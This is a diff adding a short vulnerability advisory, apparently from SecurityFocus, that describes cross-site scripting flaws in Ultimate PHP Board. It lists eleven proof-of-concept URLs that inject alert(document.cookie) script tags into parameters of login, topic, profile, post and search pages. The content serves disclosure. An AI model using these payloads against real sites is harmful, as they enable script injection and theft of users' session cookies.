@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/13971/info
+
+Ultimate PHP Board is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage any of these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/upb/login.php?ref=%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/upb/viewtopic.php?id=%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/upb/viewtopic.php?id=1&t_id=1&page=%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/upb/profile.php?action=get&id=%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/upb/newpost.php?id=1&t=1&t_id=%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/upb/newpost.php?id=%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/upb/email.php?id=%27%3E%3Cscript%3Ealert(document.cookies)%3C/script%3E
+http://www.example.com/upb/icq.php?action=get&id=%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/upb/aol.php?action=get&id=%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/upb/getpass.php?ref=%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/upb/search.php?step=3&sText=%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E 
